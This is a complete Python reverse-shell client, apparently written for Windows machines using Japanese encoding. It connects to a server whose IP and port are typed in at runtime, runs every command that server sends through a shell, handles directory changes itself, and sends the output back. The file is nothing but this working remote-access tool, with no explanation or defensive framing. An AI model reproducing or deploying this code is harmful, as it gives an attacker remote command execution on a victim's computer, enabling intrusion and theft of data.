import os
import socket
import subprocess

SERVER_HOST = input("target ip? : ")
SERVER_PORT = int(input("target port? : "))
BUFFER_SIZE = 100000

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    command = command.split()

    if command[0]=="cd":
        os.chdir(command[1])
        s.send("ok".encode())
    else:
        output = subprocess.run(command, capture_output=True, shell=True)

        if (output.stdout==b'') and (output.stderr==b''):
            s.send("ok".encode())
        if output.stdout!=b'':
            s.send(output.stdout.decode("cp932").encode())
        if output.stderr!=b'':
            s.send(output.stderr.decode("cp932").encode())

s.close()
